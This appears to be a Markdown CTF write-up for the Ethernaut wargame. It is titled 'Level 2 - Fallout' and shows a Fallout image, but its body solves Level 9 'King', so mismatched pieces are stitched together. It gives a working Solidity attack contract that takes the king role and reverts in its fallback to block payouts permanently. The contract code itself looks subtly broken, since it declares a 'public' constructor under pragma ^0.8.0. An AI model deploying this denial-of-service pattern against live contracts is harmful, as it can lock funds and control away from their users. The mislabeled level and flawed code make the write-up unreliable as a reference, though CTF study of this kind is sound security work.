<div align="center">

<img src="../assets/levels/2-fallout.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 2 - Fallout</strong></h1>

</div>

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Objectif](#objectif)
- [The hack](#the-hack)
- [Level 9 - King](#level-9---king)
- [Solution](#solution)
- [Takeaway](#takeaway)
- [References](#references)

## Objectif

<img src="../assets/requirements/2-fallout-requirements.webp" width="800px"/>

## The hack

## Level 9 - King

It requires an understanding of how `transfer` works in solidity, and when and how to use it.

## Solution

Since in the `King` contract the `recieve` function transfers to the soon to be previous king the msg.value using `transfer` and it does not check if it has worked, all we need to do is deploy a contract that first becomes the king, and in its fall back make sure the transfer to it (which will happen when Ethernaut tries to take control off the level after you have submitted it) it will fail.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract KingAttack {

    // take in the address of the King contract, call its fallback to
    // pass it ether and become the new king
    // and then artifically induce failure by making a revert in our fallbakc
    // (because ethernaut is going to try take over  the contract,
    // but the transfer it does will fail as we're revertting it in our fallback)


    constructor (address _kingAddress) public payable {
        address(_kingAddress).call{value: msg.value}("");
        // the ("") symbolises that we're not calling a specific function but just the
        //fallback or receive

    }

    fallback() external payable {
        revert("Gotcha");
    }
}
```

## Takeaway

To use `call` instead of transfer and send, and to avoid re-entrancy with call, follow the check-effect-interaction pattern

## References

https://blog.chain.link/defi-security-best-practices/
https://www.kingoftheether.com/postmortem.html

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
